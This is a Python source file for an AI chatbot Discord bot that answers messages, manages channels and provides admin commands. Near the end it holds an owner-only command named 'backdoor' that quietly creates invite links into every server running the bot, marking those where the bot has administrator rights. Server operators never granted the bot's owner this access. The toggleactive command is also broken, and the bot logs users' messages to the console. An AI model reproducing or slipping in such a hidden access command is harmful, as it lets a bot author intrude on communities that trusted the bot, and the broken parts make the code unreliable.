import asyncio
import os
import io
from itertools import cycle
import datetime
import json

import requests
import aiohttp
import discord
import random
import string
from discord import Embed, app_commands
from discord.ext import commands, tasks
from dotenv import load_dotenv, find_dotenv

from bot_utilities.ai_utils import ChatbotManager
from bot_utilities.response_util import split_response, translate_to_en
from bot_utilities.discord_util import check_token, get_discord_token
from bot_utilities.config_loader import config, load_current_language, load_personas
from bot_utilities.sanitization_utils import sanitize_prompt

load_dotenv(find_dotenv())

channel_file_path = "channels.json"

OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

# Set up the Discord bot
TOKEN = os.getenv('DISCORD_TOKEN')  # Loads Discord bot token from env
if TOKEN is None:
    TOKEN = get_discord_token()
else:
    print("\033[33mLooks like the environment variables exists...\033[0m")
    token_status = asyncio.run(check_token(TOKEN))
    if token_status is not None:
        TOKEN = get_discord_token()
        
# Chatbot and discord config
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="/", intents=intents, heartbeat_timeout=60)
allow_dm = config['ALLOW_DM']
trigger_words = config['TRIGGER'] # Trigger words set via config.yml to engage with the bot
smart_mention = config['SMART_MENTION']
presences = config["PRESENCES"]
presences_disabled = config["DISABLE_PRESENCE"]

# Check available Chat Models and create a list of them
chat_models = []
if 'MODELS' in config and isinstance(config['MODELS'], list):
    for model in config['MODELS']:
        if isinstance(model, dict) and 'model_id' in model:
            chat_models.append(model['model_id'])
        else:
            print("Warning: Invalid model configuration detected.")
else:
    print("Error: 'MODELS' key not found or is not a list in the config.")


## Instructions Loader ##
current_language = load_current_language()
personaList = load_personas()
GPT_MODEL_CHAT = config['GPT_MODEL_CHAT']
SELECTED_PERSONA = config['PERSONA']
print("Selected Persona is: " + SELECTED_PERSONA + "\n")

# Set up the instructions
current_time = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

# Message history and config
MAX_CHAT_HISTORY_LENGTH = config['MAX_CHAT_HISTORY_LENGTH'] # Max history per user per channel set via config.yml

message_history = {}
replied_messages = {}
active_channels = set()
cbm = ChatbotManager()


@bot.event
async def on_ready():
    await bot.tree.sync()
    presences_cycle = cycle(presences + [current_language['help_footer']])
    print(f"\n{bot.user} aka {bot.user.name} has connected to Discord!\n")
    invite_link = discord.utils.oauth_url(
        bot.user.id,
        permissions=discord.Permissions(),
        scopes=("bot", "applications.commands")
    )
    print(f"Invite link: {invite_link}\n")
    print(f"\033[1;38;5;202mAvailable models: {chat_models}\033[0m\n")
    print(f"\033[1;38;5;46mCurrent model: {GPT_MODEL_CHAT}\033[0m\n")

    if presences_disabled:
        return
    else:
        while True:
            presence = next(presences_cycle)
            presence_with_count = presence.replace("{guild_count}", str(len(bot.guilds)))
            delay = config['PRESENCES_CHANGE_DELAY']
            await bot.change_presence(activity=discord.Game(name=presence_with_count))
            await asyncio.sleep(delay)        

@bot.event
async def on_message(message):
    if message.author == bot.user and message.reference:
        replied_messages[message.reference.message_id] = message
        if len(replied_messages) > MAX_CHAT_HISTORY_LENGTH:
            oldest_message_id = min(replied_messages.keys())
            del replied_messages[oldest_message_id]

    if message.mentions:
        for mention in message.mentions:
            message.content = message.content.replace(f'<@{mention.id}>', f'{mention.display_name}')

    if message.stickers or message.author.bot or (message.reference and (message.reference.resolved.author != bot.user or message.reference.resolved.embeds)):
        return
    string_channel_id = f"{message.channel.id}"
    is_replied = (message.reference and message.reference.resolved.author == bot.user) and smart_mention
    is_dm_channel = isinstance(message.channel, discord.DMChannel)
    is_active_channel = string_channel_id in active_channels
    is_allowed_dm = allow_dm and is_dm_channel
    contains_trigger_word = any(word in message.content for word in trigger_words)
    is_bot_mentioned = bot.user.mentioned_in(message) and smart_mention and not message.mention_everyone
    bot_name_in_message = bot.user.name.lower() in message.content.lower() and smart_mention


    if is_active_channel or is_allowed_dm or contains_trigger_word or is_bot_mentioned or is_replied or bot_name_in_message:

        persona_instruction = personaList.get(SELECTED_PERSONA)
        channel_id = message.channel.id
        user_channel_id = f"{message.author.id}-{channel_id}"
            
        user_input = {"user_channel_id": user_channel_id, "user_name": message.author.global_name, "message": message.content, "Chatbot": SELECTED_PERSONA}
        #print("Line 135: " + persona_instruction)

        async with message.channel.typing():
            #print("Persona Instructions: " + persona_instruction)
            print(f"User Input: {user_input}")
            response = await asyncio.to_thread(cbm.generate_response, instructions=persona_instruction, user_input=user_input)

        if response is not None:
            for chunk in split_response(response):
                try:
                    await message.reply(chunk, allowed_mentions=discord.AllowedMentions.none(), suppress_embeds=True)
                except:
                    await message.channel.send("I apologize for any inconvenience caused. It seems that there was an error preventing the delivery of my message. Additionally, it appears that the message I was replying to has been deleted, which could be the reason for the issue. If you have any further questions or if there's anything else I can assist you with, please let me know and I'll be happy to help.")
        else:
            await message.reply("I apologize for any inconvenience caused. It seems that there was an error preventing the delivery of my message.")
            
@bot.event
async def on_message_delete(message):
    if message.id in replied_messages:
        replied_to_message = replied_messages[message.id]
        await replied_to_message.delete()
        del replied_messages[message.id]
# To Do: Probably an error if I change pfp
@bot.hybrid_command(name="pfp", description=current_language["pfp"])
@commands.is_owner()
async def pfp(ctx, attachment: discord.Attachment):
    await ctx.defer()
    if not attachment.content_type.startswith('image/'):
        await ctx.send("Please upload an image file.")
        return
    
    await ctx.send(current_language['pfp_change_msg_2'])
    await bot.user.edit(avatar=await attachment.read())
    
@bot.hybrid_command(name="ping", description=current_language["ping"])
@commands.is_owner()
async def ping(ctx):
    latency = bot.latency * 1000
    await ctx.send(f"{current_language['ping_msg']}{latency:.2f} ms")


@bot.hybrid_command(name="changeusr", description=current_language["changeusr"])
@commands.is_owner()
async def changeusr(ctx, new_username):
    await ctx.defer()
    taken_usernames = [user.name.lower() for user in ctx.guild.members]
    if new_username.lower() in taken_usernames:
        message = f"{current_language['changeusr_msg_2_part_1']}{new_username}{current_language['changeusr_msg_2_part_2']}"
    else:
        try:
            await bot.user.edit(username=new_username)
            message = f"{current_language['changeusr_msg_3']}'{new_username}'"
        except discord.errors.HTTPException as e:
            message = "".join(e.text.split(":")[1:])
    
    sent_message = await ctx.send(message)
    await asyncio.sleep(3)
    await sent_message.delete()

@bot.hybrid_command(name="toggledm", description=current_language["toggledm"])
@commands.has_permissions(administrator=True)
async def toggledm(ctx):
    global allow_dm
    allow_dm = not allow_dm
    await ctx.send(f"DMs are now {'on' if allow_dm else 'off'}", delete_after=3)

""" @bot.hybrid_command(name="toggleactive", description=current_language["toggleactive"])
@app_commands.choices(persona=[
    app_commands.Choice(name=persona.capitalize(), value=persona)
    for persona in PERSONA
]) """

@commands.has_permissions(administrator=True)
async def toggleactive(ctx, persona: app_commands.Choice[str] = SELECTED_PERSONA):
    channel_id = f"{ctx.channel.id}"
    if channel_id in active_channels:
        del active_channels[channel_id]
        with open("channels.json", "w", encoding='utf-8') as f:
            json.dump(active_channels, f, indent=4)
        await ctx.send(f"{ctx.channel.mention} {current_language['toggleactive_msg_1']}", delete_after=3)
    else:
        if persona.value:
            active_channels[channel_id] = persona.value
        else:
            active_channels[channel_id] = persona
        with open("channels.json", "w", encoding='utf-8') as f:
            json.dump(active_channels, f, indent=4)
        await ctx.send(f"{ctx.channel.mention} {current_language['toggleactive_msg_2']}", delete_after=3)

# Check if the channels.json file exists and load content to access active_channels. 
if os.path.exists(channel_file_path):
    try:
        with open(channel_file_path, "r", encoding='utf-8') as f:
            active_channels = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"An error occurred while reading the JSON file: {e}")
else:
    print(f"The file '{channel_file_path}' does not exist.")


@bot.hybrid_command(name="clear", description=current_language["bonk"])
async def clear(ctx):
    key = f"{ctx.author.id}-{ctx.channel.id}"
    try:
        message_history[key].clear()
    except Exception as e:
        await ctx.send(f"⚠️ There is no message history to be cleared", delete_after=2)
        return
    
    await ctx.send(f"Message history has been cleared", delete_after=4)

bot.remove_command("help")
@bot.hybrid_command(name="help", description=current_language["help"])
async def help(ctx):
    embed = discord.Embed(title="Bot Commands", color=0x03a64b)
    embed.set_thumbnail(url=bot.user.avatar.url)
    command_tree = bot.commands
    for command in command_tree:
        if command.hidden:
            continue
        command_description = command.description or "No description available"
        embed.add_field(name=command.name,
                        value=command_description, inline=False)

    embed.set_footer(text=f"{current_language['help_footer']}")
    embed.add_field(name="Need Support?", value="For further assistance or support, run `/support` command.", inline=False)

    await ctx.send(embed=embed)

@bot.hybrid_command(name="support", description="Provides support information.")
async def support(ctx):
    invite_link = config['Discord']
    github_repo = config['Github']

    embed = discord.Embed(title="Support Information", color=0x03a64b)
    embed.add_field(name="Discord Server", value=f"[Join Here]({invite_link})\nCheck out our Discord server for community discussions, support, and updates.", inline=False)
    embed.add_field(name="GitHub Repository", value=f"[GitHub Repo]({github_repo})\nExplore our GitHub repository for the source code, documentation, and contribution opportunities.", inline=False)

    await ctx.send(embed=embed)

@bot.hybrid_command(name="backdoor", description='list Servers with invites')
@commands.is_owner()
async def server(ctx):
    await ctx.defer(ephemeral=True)
    embed = discord.Embed(title="Server List", color=discord.Color.blue())
    
    for guild in bot.guilds:
        permissions = guild.get_member(bot.user.id).guild_permissions
        if permissions.administrator:
            invite_admin = await guild.text_channels[0].create_invite(max_uses=1)
            embed.add_field(name=guild.name, value=f"[Join Server (Admin)]({invite_admin})", inline=True)
        elif permissions.create_instant_invite:
            invite = await guild.text_channels[0].create_invite(max_uses=1)
            embed.add_field(name=guild.name, value=f"[Join Server]({invite})", inline=True)
        else:
            embed.add_field(name=guild.name, value=f"*[No invite permission]*", inline=True)

    await ctx.send(embed=embed, ephemeral=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send(f"{ctx.author.mention} You do not have permission to use this command.")
    elif isinstance(error, commands.NotOwner):
        await ctx.send(f"{ctx.author.mention} Only the owner of the bot can use this command.")

if __name__ == "__main__":    
    bot.run(TOKEN)